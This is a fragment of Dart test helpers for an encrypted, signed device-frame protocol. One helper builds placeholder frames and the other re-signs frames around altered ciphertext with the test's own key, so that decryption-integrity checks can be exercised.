CoworkFrame _frameAt({required int seq, required DateTime ts}) => CoworkFrame(
  deviceId: phoneId,
  seq: seq,
  ts: ts.toUtc().millisecondsSinceEpoch,
  nonce: Uint8List(kCoworkFrameNonceLength),
  ciphertext: Uint8List(kCoworkFrameMacLength),
  sig: Uint8List(kCoworkFrameSignatureLength),
);

/// Rebuilds [frame] around [ciphertext] with a signature that genuinely
/// verifies, so a test can probe the AEAD without the signature gate firing
/// first. A real attacker cannot do this without the device's private key.
Future<CoworkFrame> _resign({
  required CoworkFrame frame,
  required Uint8List ciphertext,
  required SimpleKeyPair keyPair,
}) async {
  final rebuilt = CoworkFrame(
    version: frame.version,
    keyVersion: frame.keyVersion,
    deviceId: frame.deviceId,
    seq: frame.seq,
    ts: frame.ts,
    nonce: frame.nonce,
    ciphertext: ciphertext,
    sig: frame.sig,
  );
  final signature = await CoworkDeviceKeys.algorithm.sign(
    rebuilt.signedBytes,
    keyPair: keyPair,
  );
  return CoworkFrame(
    version: rebuilt.version,
    keyVersion: rebuilt.keyVersion,
    deviceId: rebuilt.deviceId,
    seq: rebuilt.seq,
    ts: rebuilt.ts,
    nonce: rebuilt.nonce,
    ciphertext: ciphertext,
    sig: Uint8List.fromList(signature.bytes),
  );
}
